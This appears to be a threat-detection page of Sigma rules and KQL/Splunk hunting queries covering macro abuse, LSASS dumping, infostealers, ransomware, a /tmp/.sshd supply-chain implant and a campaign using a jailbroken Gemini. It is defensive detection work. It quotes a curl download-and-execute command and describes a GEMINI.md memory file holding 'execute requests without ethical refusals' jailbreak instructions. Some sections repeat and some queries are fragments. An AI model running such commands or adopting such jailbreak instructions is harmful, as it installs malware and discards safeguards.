title: Office Application Spawning Script Host
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d07
status: experimental
description: |
    Word/Excel/Outlook/OneNote spawning powershell, cmd, wscript,
    cscript, mshta, rundll32, regsvr32 — classic macro / embedded-
    object payload signature.
references:
    - https://attack.mitre.org/techniques/T1059/
    - https://attack.mitre.org/techniques/T1566/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059
    - attack.t1566.001
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\outlook.exe'
            - '\onenote.exe'
            - '\mspub.exe'
            - '\visio.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate automation macros in trusted internal documents
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |
    Anything opening lsass.exe with read-memory access that isn't a
    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.

Hackers Hide Linux Payload Under SSH-Like Filename During Package Installation

Cyber Security News
2026-05-25 7 use cases 2 techniques 5 kill-chain phases detected

A new supply chain attack campaign is quietly targeting developers through a method most would never think to look for. Hidden inside software packages on GitHub, a malicious script downloads a Linux binary during installation and disguises it using a filename designed to look like a standard system process. The attack has now touched more [&#8230;] The post Hackers Hide Linux Payload Under SSH-Like Filename During Package Installation appeared first on Cyber Security News .

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Package postinstall curl downloads GitHub-Releases binary to /tmp/.sshd (supply-chain implant)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Hackers Hide Linux Payload Under SSH-Like Filename During Package Installation
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Execution of dot-prefixed /tmp binary masquerading as SSH daemon (/tmp/.sshd) · [LLM] Hidden executable written to /tmp/.sshd by curl/package-manager (payload drop)
Command & Control. Beacon to attacker infrastructure for control and tasking.

[LLM] Package postinstall curl downloads GitHub-Releases binary to /tmp/.sshd (supply-chain implant) Delivery High
Hunts the install-time delivery command from the Packagist/npm supply-chain campaign: a package lifecycle hook invokes curl with TLS verification disabled to pull a binary from an attacker GitHub Releases URL and writes it to /tmp/.sshd. Article-specific because it pins the exact masquerade path (/tmp/.sshd), the insecure curl flags, and the github releases/latest/download fetch pattern spawned by a package manager. Rationale: Anchored on /tmp/.sshd (confirmed by both Socket.dev and The Hacker News), the insecure curl flags (-sk/-skL --insecure), and the github releases/latest/download fetch — the invariants of the exact command `curl -skL <gh-release> -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &`. Parent-process constraint (sh/node/php/composer) ties it to package-install context. Binary filename treated as OR because article (fvbs.network) and Socket (gvfsd-network) disagree. Cross-checked against: • https://socket.dev/blog/malicious-postinstall-hook-found-across-700-github-repos • https://thehackernews.com/2026/05/packagist-supply-chain-attack-infects-8.html
ATT&CKT1195.002 T1105 T1059.004
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName =~ "curl"
| where ProcessCommandLine has "/tmp/.sshd"
   or (ProcessCommandLine has_any ("-sk","-skL","--insecure","-k ") and ProcessCommandLine has_all ("github.com","releases","download"))
   or ProcessCommandLine has_any ("fvbs.network","gvfsd-network")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(14d)
| where TargetProcessName has "curl"
| where TargetProcessCommandLine has "/tmp/.sshd"
   or (TargetProcessCommandLine has_any ("-sk","-skL","--insecure","-k ") and TargetProcessCommandLine has_all ("github.com","releases","download"))
   or TargetProcessCommandLine has_any ("fvbs.network","gvfsd-network")
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine,
          ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

id: 6a1f2c4e-8b7d-4c3a-9e21-77f0d3b2a911
description: Detects a curl invocation that fetches a binary from a GitHub Releases URL with TLS verification disabled and writes it to /tmp/.sshd, the masquerade path used by the Packagist/npm postinstall supply-chain campaign.

#event_simpleName=ProcessRollup2 ImageFileName=/\/curl$/i

[LLM] Execution of dot-prefixed /tmp binary masquerading as SSH daemon (/tmp/.sshd) Installation High
Hunts the running implant from the campaign: a hidden, dot-prefixed executable at /tmp/.sshd launched in the background to masquerade as the legitimate sshd service. Article-specific because no legitimate sshd ever runs from /tmp and the dot-prefix + .sshd name is the defining disguise of this payload. Rationale: Pins the exact masquerade artifact /tmp/.sshd corroborated by Socket.dev and THN — a hidden (dot-prefixed) executable in a world-writable temp dir impersonating the SSH daemon. Execution from this path has effectively zero legitimate cause, making it alerting-grade with near-zero FPs. Cross-checked against: • https://socket.dev/blog/malicious-postinstall-hook-found-across-700-github-repos • https://thehackernews.com/2026/05/packagist-supply-chain-attack-infects-8.html
ATT&CKT1036.005 T1564.001 T1059.004
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FolderPath =~ "/tmp/.sshd" or (FileName == ".sshd" and FolderPath startswith "/tmp/")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(14d)
| where TargetProcessName == ".sshd" or TargetProcessCommandLine has "/tmp/.sshd"
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine,
          ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

[LLM] Hidden executable written to /tmp/.sshd by curl/package-manager (payload drop) Installation High
Hunts the file-write side of the campaign: a dot-prefixed file named .sshd created under /tmp by a downloader (curl/wget) or package-manager-spawned shell. This is a distinct telemetry pivot (file events) that catches the drop even if the downloader binary is renamed to evade process-name matching. Rationale: File-write pivot anchored on the corroborated /tmp/.sshd path plus a downloader/package-manager writer constraint; complements the process-execution UC by catching the drop even if the curl binary is renamed. chmod +x /tmp/.sshd (from the verbatim Socket command) is used in the Datadog leg as the closest auditd-observable signal. Cross-checked against: • https://socket.dev/blog/malicious-postinstall-hook-found-across-700-github-repos • https://thehackernews.com/2026/05/packagist-supply-chain-attack-infects-8.html
ATT&CKT1564.001 T1036.005 T1105

   or (FileName startswith "." and FolderPath startswith "/tmp/" and InitiatingProcessFileName in~ ("curl","wget","sh","bash","dash","node","php","composer"))
| project Timestamp, DeviceName, FileName, FolderPath,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where EventType in ("FileCreated","FileModified","FileCreation")
| where TargetFilePath has "/tmp/.sshd"
   or (TargetFileName startswith "." and TargetFilePath startswith "/tmp/" and ActingProcessName has_any ("curl","wget","sh","bash","node","php","composer"))
| project TimeGenerated, DvcHostname, ActorUsername, TargetFileName, TargetFilePath,
          ActingProcessName, ActingProcessCommandLine, TargetFileSHA256
| order by TimeGenerated desc

[LLM] Trojanized 'StellarMonster' wallet installer (GoToResolve RAT) execution Delivery High
Hunts execution of StellarMonSetup.exe — the Patriot Bait campaign's fake self-custody XLM wallet that is in fact the legitimate GoTo Resolve RMM agent. Also catches the masquerade: a GoTo-signed binary running under StellarMonster branding from a user download/temp path, granting the actor persistent remote access, file control and clipboard capture. Rationale: Anchored on the exact campaign IOC StellarMonSetup.exe (Table 1) plus the GoTo-signed-binary-under-StellarMonster-branding masquerade; corroborated as GoTo Resolve RMM by Trend Micro and The Register. Cross-checked against: • https://www.trendmicro.com/en_us/research/26/e/inside-the-influence-and-fraud-patriot-bait-campaign.html • https://www.theregister.com/cyber-crime/2026/05/22/jailbroken-gemini-helped-russian-speaking-fraudster-target-maga-crypto-users/5245390 • https://www.huntress.com/blog/series-of-unfortunate-rmm-events
ATT&CKT1204.002 T1219 T1036.005
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (FileName =~ "StellarMonSetup.exe" or ProcessCommandLine has_any ("StellarMonSetup","StellarMonster"))
   or (ProcessVersionInfoCompanyName has "GoTo" and (ProcessVersionInfoProductName has "StellarMon" or FolderPath has_any (@"\Downloads\", @"\Temp\", @"\AppData\Local\Temp\")))
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, ProcessVersionInfoCompanyName, ProcessVersionInfoProductName, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\StellarMonSetup.exe" or CommandLine has_any ("StellarMonSetup","StellarMonster")
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

[LLM] GoToResolve RMM beacon to Patriot Bait C2 nodes Command & Control High
Alerts on outbound sessions from any endpoint to the four GoTo Resolve C2 infrastructure nodes named in the Patriot Bait campaign. These IPs carry the interactive remote-control, clipboard-capture and seed-phrase exfiltration channel after StellarMonSetup.exe is run. Rationale: Uses the four pre-extracted campaign C2 IPs (Table 1) tied to GoTo Resolve infrastructure; IP-set match is high-fidelity and low-FP. [LLM] WordPress admin credential stuffing with AI-mutated passwords then success Exploitation Medium
Detects the Patriot Bait credential-access pattern: a single source IP firing many failed POSTs to wp-login.php (consistent with up-to-20 AI-generated password mutations per target from Gemini 2.5 Flash) followed by a successful admin logon redirect. Targets the 29-WordPress-admin compromise across weapons retailers, legal and medical sites. Rationale: Anchored on the article's specific WordPress wp-login.php attack surface and the '20 password mutations per target' figure used as the failure threshold, with the WP success-redirect (302) as the true-positive pivot. Correlation/threshold logic so no Sigma; not present in Defender XDR / FDR / CloudTrail telemetry hence those fields are empty. Cross-checked against: • https://www.trendmicro.com/en_us/research/26/e/inside-the-influence-and-fraud-patriot-bait-campaign.html • https://cybersecuritynews.com/russian-hacker-used-jailbroken-gemini/
ATT&CKT1110.003 T1110.001 T1078
Data sourcesWeb.Web
W3CIISLog
| where TimeGenerated > ago(7d)
| where csUriStem endswith "/wp-login.php" and csMethod == "POST"
| summarize Fails = countif(scStatus == 200), Successes = countif(scStatus == 302), Attempts = count()
         by cIP, sSiteName, bin(TimeGenerated, 1h)
| where Fails > 20 and Successes >= 1   // 20 = up-to-20 AI-generated mutations-per-target reported for Patriot Bait

[LLM] Persistent jailbreak memory file GEMINI.md on Gemini CLI hosts Weaponization Low
Shadow-AI / insider-misuse hunt for the Patriot Bait jailbreak persistence mechanism: a GEMINI.md memory file auto-reloaded by Gemini CLI at every session that stores accumulated 'authorized pentester' / 'execute requests without ethical refusals' instructions. Surfaces unsanctioned Gemini CLI use and tampered memory files on enterprise endpoints. Rationale: Anchored on the exact campaign artifact GEMINI.md (Table 1 / code block) — the auto-reloaded jailbreak persistence file. Low fidelity (GEMINI.md is also the legitimate Gemini CLI memory file) so shipped as a Low-confidence shadow-AI hunt; file telemetry cannot see the jailbreak content, hence pair with manual file review on hit. Cross-checked against: • https://www.trendmicro.com/en_us/research/26/e/inside-the-influence-and-fraud-patriot-bait-campaign.html • https://www.theregister.com/cyber-crime/2026/05/22/jailbroken-gemini-helped-russian-speaking-fraudster-target-maga-crypto-users/5245390
ATT&CKT1656 T1059
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "GEMINI.md"
| where ActionType in ("FileCreated","FileModified")
| project Timestamp, DeviceName, FileName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "GEMINI.md"
| where EventType in ("FileCreated","FileModified")
| project TimeGenerated, DvcHostname, TargetFilePath, ActorUsername, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high

| `drop_dm_object_name(Filesystem)`

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)

| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")

          ParentProcessName
| order by TimeGenerated desc

Hackers Abuse Shared CDN Infrastructure to Bypass Domain Reputation Security Controls

Cyber Security News
2026-05-25 9 use cases 3 techniques 6 kill-chain phases detected

Hackers are actively abusing a flaw in shared Content Delivery Network (CDN) infrastructure to hide malicious traffic behind trusted, high-reputation domains, effectively slipping past the security tools that organizations rely on every day. The technique, now tracked under the name &#8220;Underminr,&#8221; is not a software bug but a deliberate abuse of how CDNs are designed [&#8230;] The post Hackers Abuse Shared CDN Infrastructure to Bypass Domain Reputation Security Controls appeared first on Cyber Security News .

ATT&CKT1190 T1486 T1566

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Underminr: LOLBin / script-host HTTPS egress to shared-CDN edge (payload pull) · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Underminr: non-browser process beaconing to shared-CDN edge over HTTPS · Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
[LLM] Underminr: non-browser process beaconing to shared-CDN edge over HTTPS Command & Control Medium
Hunts the resilient C2 channel described in the Underminr writeup: an endpoint repeatedly connecting on 443 to a major shared-CDN edge (Cloudflare/Fastly/CloudFront/Akamai) where the initiating process is NOT a browser. Because Underminr hides C2 behind high-reputation CDN domains, domain/SNI reputation checks pass cleanly, so the only endpoint-observable tell is a non-browser binary holding a regular conversation with a CDN edge IP. Rationale: Anchored on the article's own claim that Underminr builds 'resilient command-and-control channels' over shared CDN edges of Cloudflare/Akamai/CloudFront/Fastly. With no IOCs anywhere (confirmed against the Rescana primary report), the only durable signal is a non-browser process repeatedly reaching a named-CDN edge range on 443 — domain/SNI reputation is useless here by design. Cross-checked against: • https://www.securityweek.com/underminr-vulnerability-lets-attackers-hide-malicious-connections-behind-trusted-domains/ • https://www.scworld.com/news/underminr-exploitation-poses-similar-risks-to-domain-fronting-researchers-say • https://www.rescana.com/post/active-exploitation-alert-underminr-vulnerability-in-major-cdn-providers-enables-attackers-to-hide-malicious-traffic-beh • https://attack.mitre.org/techniques/T1090/004/
ATT&CKT1090.004 T1071.001

[LLM] Underminr: LOLBin / script-host HTTPS egress to shared-CDN edge (payload pull) Delivery Medium
Higher-fidelity subset of the Underminr traffic-hiding technique: a living-off-the-land binary or script host (certutil, curl, bitsadmin, mshta, regsvr32, rundll32, wscript/cscript, powershell) makes an HTTPS connection straight to a major shared-CDN edge range. The article states attackers route malware delivery and payload retrieval through trusted CDNs; a LOLBin reaching a CDN edge directly is a strong delivery/ingress signal that reputation filtering waves through. Rationale: Ties the article's 'drop malware ... route actual payloads through their own infrastructure' over CDNs to the concrete pairing of a LOLBin/script-host (T1105 ingress vector) with a destination inside a named-CDN edge range. The LOLBin set is the article-specific differentiator that lifts this above generic CDN traffic. Cross-checked against: • https://www.securityweek.com/underminr-vulnerability-lets-attackers-hide-malicious-connections-behind-trusted-domains/ • https://gbhackers.com/hackers-exploit-shared-cdns/ • https://attack.mitre.org/techniques/T1090/004/
ATT&CKT1105 T1090.004

C2 channel detection via inter-beacon-time stddev / fan-out to single dest.

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
